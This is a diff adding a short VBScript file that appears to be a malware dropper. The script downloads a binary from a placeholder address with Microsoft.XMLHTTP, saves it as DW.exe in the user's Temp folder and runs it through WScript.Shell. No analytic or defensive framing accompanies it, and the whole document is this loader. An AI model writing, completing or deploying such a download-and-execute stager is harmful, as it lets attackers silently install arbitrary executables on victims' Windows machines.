@@ -1,0 +1,18 @@
+﻿dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", "123456", False
+xHttp.Send
+scriptShell = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") + "\DW.exe"
+with bStrm
+    .type = 1
+    .open
+    .write xHttp.responseBody
+    .savetofile scriptShell, 2
+end with
+WScript.Sleep 1000
+Execut(scriptShell)
+
+Function Execut(path)
+Set objShell = CreateObject("Wscript.shell")
+objShell.run(path)
+End Function
